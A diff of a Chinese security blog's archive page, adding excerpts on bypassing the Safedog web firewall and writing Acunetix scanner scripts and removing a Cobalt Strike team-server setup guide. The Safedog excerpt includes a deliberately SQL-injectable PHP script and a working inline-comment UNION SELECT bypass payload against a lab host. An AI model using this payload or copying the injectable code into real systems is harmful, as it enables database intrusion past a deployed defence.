@@ -45,6 +45,70 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
+      <time datetime="2014-07-03T01:53:48.000Z" itemprop="datePublished">
+          2014-07-03
+      </time>
+    
+    
+    | 
+    <a href='/tag/SQL注入/'>SQL注入</a>,
+    
+    <a href='/tag/安全狗/'>安全狗</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/1089.seo/">全方位绕过安全狗</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p><b>一、前言</b><b></b></p>  <p><a href="http://ha.cker.in/tag/安全狗" target="_blank">安全狗</a>是一款大家熟悉的服务器安全加固产品，据称已经拥有50W的用户量。最近经过一些研究，发现<a href="http://ha.cker.in/tag/安全狗" target="_blank">安全狗</a>的一些防护功能，例如<a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a>、文件上传、防webshell等都可以被绕过，下面为大家一一介绍。</p>  <p><b>二、测试环境</b><b></b></p>  <p>本次测试环境为</p>  <p>中文版Win2003 SP2+PHP 5.3.28+Mysql 5.1.72</p>  <p>网站安全狗IIS版3.2.08417</p>  <p><b>三、SQL注入绕过</b><b></b></p>  <p>我们先写一个存在SQL注入漏洞的php：</p>  <p>&lt;?</p>  <p>$uid = $_REQUEST[‘id’];</p>  <p>if(!$conn = @mysql_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;123456&quot;))</p>  <p>die(‘&lt;font size=+1&gt;An Error Occured&lt;/font&gt;&lt;hr&gt;unable to connect to the database.’);</p>  <p>if(!@mysql_select_db(&quot;supe&quot;,$conn))</p>  <p>die(&quot;&lt;font size=+1&gt;An Error Occured&lt;/font&gt;&lt;hr&gt;unable to find it at database on your MySQL server.&quot;);</p>  <p>$text = &quot;select <em> from supe_members where uid=&quot;.$uid;</p>  <p>$rs = mysql_query ($text,$conn);</p>  <p>while($rom = mysql_fetch_array($rs))</p>  <p>{</p>  <p>&#160;&#160;&#160; echo $rom[&quot;username&quot;];</p>  <p>}</p>  <p>?&gt;</p>  <p>我用的是supesite的库，可以看到这里是有明显<a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a>漏洞的，当没有安全狗的时候可以成功注入：</p>  <p><a href="http://img.cker.in/de86e6665f70_D948/clip_image001.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="injsuc.png" border="0" alt="全方位绕过安全狗" src="http://img.cker.in/de86e6665f70_D948/clip_image001_thumb.jpg" width="694" height="332" /></a></p>  <p>当安装安全狗之后，注入语句会被拦截：</p>  <p><a href="http://img.cker.in/de86e6665f70_D948/clip_image002.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="injfail.png" border="0" alt="全方位绕过安全狗" src="http://img.cker.in/de86e6665f70_D948/clip_image002_thumb.jpg" width="694" height="312" /></a></p>  <p>经过测试发现，安全狗这块的匹配正则应该是\s+and这类的，所以只要想办法去掉空格，用普通注释/**/是不行的，安全狗也防了这块。但是对内联注释/</em>!and<em>/这种不知道为什么安全狗没有拦截。</p>  <p>用下面语句成功绕过SQL注入过滤：</p>  <p><a href="http://192.168.200.115/inj.php?id=1/">http://192.168.200.115/inj.php?id=1/</a></em>!and<em>/1=2/</em>!union<em>//</em>!select*/1,2,version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17</p>  <p><a href="http://img.cker.in/de86e6665f70_D948/clip_image003.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="injbypass.png" border="0" alt="全方位绕过安全狗" src="http://img.cker.in/de86e6665f70_D948/clip_image003_thumb.jpg" width="694" height="350" /></a></p>  <p>有人说只有POST才可以，但是我测试最新版本的安全狗GET注入也是可以用这种方法绕过的。</p>  <p><b>四、文件上传绕过</b><b></b></p>  <p>安全狗的防上传也是做在WEB层，即分析HTTP协议来防止上传，按照yuange说的安全是一个条件语句，这显然是不符合安全规范的，只检查HTTP并不能保证文件系统层上的问题。</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/1089.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2014-07-02T12:34:32.000Z" itemprop="datePublished">
+          2014-07-02
+      </time>
+    
+    
+    | 
+    <a href='/tag/SQL注入/'>SQL注入</a>,
+    
+    <a href='/tag/Discuz/'>Discuz</a>,
+    
+    <a href='/tag/Acunetix-Web-Vulnerability-Scanner/'>Acunetix Web Vulnerability Scanner</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/1088.seo/">编写自己的Acunetix WVS漏洞脚本详细教程</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        AWVS提供了自定义的脚本编程接口，可是网上的资料很少，只有官方的几篇介绍和参考手册，最近研究了一下怎么编写AWVS的漏洞脚本来写一篇简单性的文章，大家有兴趣的可以交流 。  本文以8.0为例，首先呢安装好Acunetix Web Vulnerability Scanner 8（该破解的破解，该付费的付费），然后我们需要WVS公开的小小的SDK，下载地址：http://www.acunetix.com/download/tools/WV
+      
+      </p>
+      
+      <p>
+          <a href="/1088.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
       <time datetime="2014-07-02T10:28:06.000Z" itemprop="datePublished">
           2014-07-02
       </time>
@@ -170,73 +234,9 @@
     </section>
   </article>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2014-05-25T03:24:31.000Z" itemprop="datePublished">
-          2014-05-25
-      </time>
-    
-    
-    | 
-    <a href='/tag/Mysql/'>Mysql</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/1083.seo/">开启MySQL的sql语句记录</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        在开发的时候经常会想看一下MySQL最终执行的sql或者想保存sql记录，所以我们可以启用MySQL的sql记录功能。   开启方法：   编辑MySQL的my.cnf文件，在文件的[mysqld]节点最下面添加下面的文本：   log-output=FILE   general-log=1    general_log_file=mysql-general.log   最后重启一下MySQL服务就可以了，最后会 记录在mysql的da
-      
-      </p>
-      
-      <p>
-          <a href="/1083.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2014-05-14T05:40:40.000Z" itemprop="datePublished">
-          2014-05-14
-      </time>
-    
-    
-    | 
-    <a href='/tag/meterpreter/'>meterpreter</a>,
-    
-    <a href='/tag/Metasploit/'>Metasploit</a>,
-    
-    <a href='/tag/Cobalt-Strike/'>Cobalt Strike</a>,
-    
-    <a href='/tag/Armitage/'>Armitage</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/1082.seo/">Cobalt Strike 之团队服务器的搭建与DNS通讯演示</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>0x00 背景</p>  <hr align="left" size="5" width="100%" noshade="noshade" />  <p><a href="http://ha.cker.in/tag/Cobalt Strike" target="_blank">Cobalt Strike</a> 一款以metasploit为基础的GUI的框框架式渗透工具，<a href="http://ha.cker.in/tag/Armitage" target="_blank">Armitage</a>的商业版，集成了端口发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑，mac os 木马生成，钓鱼攻击包括：站点克隆，目标信息获取，java执行，游览器自动攻击等等。</p>  <p>Cobalt Strike 官网为 <a href="http://www.advancedpentest.com/">Cobalt Strike</a> 程序只不接受大天朝的下载，各位自行想办法。<a href="http://blog.strategiccyber.com/">作者博客</a> 有很多好东西，推荐大家收藏。</p>  <p>Cobalt Strike 在1.45和以前是可以连接本机windows的<a href="http://ha.cker.in/tag/metasploit" target="_blank">metasploit</a>的，在后来就不被支持了，必须要求连接远程linux的<a href="http://ha.cker.in/tag/metasploit" target="_blank">metasploit</a>。</p>  <p>Cobalt Strike 还有个强大的功能就是他的团体服务器功能，它能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。</p>  <p>这篇文章就给大家分享下我大家团体服务器的方法（我的不一定是最好的，参考下就行了）</p>  <p>0x01 搭建</p>  <hr align="left" size="5" width="100%" noshade="noshade" />  <p>1.服务器</p>  <p>服务器强烈建议大家选择ubuntu的，内存1G以上，带宽8M以上，虽然在Centos上也帮朋友成功搭建过，但是很不推荐，稳定性和维护性都没有用ubuntu好。</p>  <p>2.安装metasploit</p>  <p>metasploit有3个版本专业版，社区版，和git上面的版本，当然大家用社区版就行了，专业版的功能比起社区版要多，但是要给钱，只能免费使用一段时间，以前找到的无限免费使用专业版也被官方封锁了，git上的版本适合高级安装的用户，具体可以自己去玩玩。</p>  <p>下载安装好社区版的metasploit后接下来就是要激活第一次访问metasploit的web管理页面必须是localhost，这好似规定死的，我这里有两种方法1.给服务器开启VNC，然后上去激活（不推荐）2.连接ssh的时候开启socks5然后游览器设置下就可以访问了。</p>  <p>还有一中快捷的安装方式就是上传<a href="http://ha.cker.in/tag/Cobalt Strike" target="_blank">Cobalt Strike</a>搭服务器，在里面有个quick-msf-setup 的脚本，它可以帮你快熟部署团体服务器环境，不过我不喜欢这种方式，我比较喜欢折腾，嘿嘿。</p>  <p>3.部署Cobalt Strike</p>  <p>将下载好的 <a href="http://ha.cker.in/tag/Cobalt Strike" target="_blank">Cobalt Strike</a> 上传到服务器，解包后会有这些文件</p>  <p><a href="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image001.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image001_thumb.jpg" width="847" height="509" /></a></p>  <p>Cobalt Strike是JAVA写的，服务器还得有JAVA环境，这里我们没必要去下载JAVA来安装，metasploit已经有了JAVA环境，我们只需要配置下环境变量就行了    <br />打开root目录下的.bashrc文件，建议先备份，在最下面添加：</p>  <p>#JAVA</p>  <p>export JAVA_HOME=/opt/metasploit/java</p>  <p>&#160;&#160;&#160; export PATH=$JAVA_HOME/bin:$JRE_HOME/bin:$PATH</p>  <p>然后在执行</p>  <blockquote>   <p>source .bashrc</p> </blockquote>  <p>最后看看是否成功</p>  <p><a href="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image002.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image002_thumb.jpg" width="1284" height="772" /></a></p>  <p>回到Cobalt Strike目录</p>  <p>执行</p>  <blockquote>   <p>./teamserver 服务器IP 连接密码</p> </blockquote>  <p><a href="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image003.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image003_thumb.jpg" width="554" height="185" /></a></p>  <p>启动的过程中会有很多警告，不用理会它，大概几分钟后出现这个就OK了</p>  <p><a href="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image004.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image004_thumb.jpg" width="847" height="509" /></a></p>  <p>这里不要关闭，然后本机启动Cobalt Strike 连接测试</p>  <p>地址是:192.168.10.62</p>  <p>端口是:55553</p>  <p>用户名是:msf</p>  <p>密码是:luom&#160; (也就是我们刚才设置的)</p>  <p><a href="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image005.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/CobaltStrikeDNS_D8A3/clip_image005_thumb.jpg" width="331" height="205" /></a></p><br>
-      
-      </p>
-      
-      <p>
-          <a href="/1082.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/archives/page/7/">← Newer Posts</a>
-    <span class="page-number">Page 8 of 57</span>
+    <span class="page-number">Page 8 of 81</span>
     <a class="older-posts" href="/archives/page/9/">Older Posts →</a>
   </nav>
 </main>
